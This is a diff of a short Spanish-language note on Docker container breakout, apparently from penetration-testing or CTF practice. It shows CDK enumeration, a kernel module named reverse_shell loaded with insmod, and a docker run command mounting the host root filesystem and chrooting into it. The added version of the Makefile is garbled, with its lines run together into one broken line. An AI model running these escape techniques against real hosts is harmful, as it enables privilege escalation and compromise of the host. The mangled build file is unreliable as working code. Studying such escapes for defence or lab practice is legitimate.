@@ -1,8 +1,10 @@
+# docker-breakout
+
 # Docker breakout
 
 ## Enumeración con CDK
 
-```null
+```
 root@a2d8c468a7c2:/tmp# ./cdk  eva --full
 ```
 
@@ -12,9 +14,9 @@ root@a2d8c468a7c2:/tmp# ./cdk  eva --full
 
 Es necesario crear un script en c para compilarlo y ejecutar comandos
 
-* shell.c
+- shell.c
 
-```null
+```
 #include <linux/kmod.h>
 #include <linux/module.h>
 MODULE_LICENSE("GPL");
@@ -33,26 +35,21 @@ module_init(reverse_shell_init);
 module_exit(reverse_shell_exit);
 ```
 
-* Makefile
+- Makefile
 
 ```makefile
-obj-m +=reverse-shell.o
-all:
-	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) modules
-clean:
-	make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) clean
+obj-m +=reverse-shell.oall:    make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) modulesclean:    make -C /lib/modules/4.15.0-142-generic/build M=$(PWD) clean
 ```
 
-#### Explotación
+### Explotación
 
-```null
+```
 root@a2d8c468a7c2:/tmp# insmod reverse-shell.ko
 ```
 
 ## Creación de contenedor con montura desde la raíz
 
-```null
+```
 spanishdancer@ariekei:/opt/docker$ docker images
 spanishdancer@ariekei:/opt/docker$ docker run -it -v /:/host/ waf-template chroot /host/ bash
 ```
-
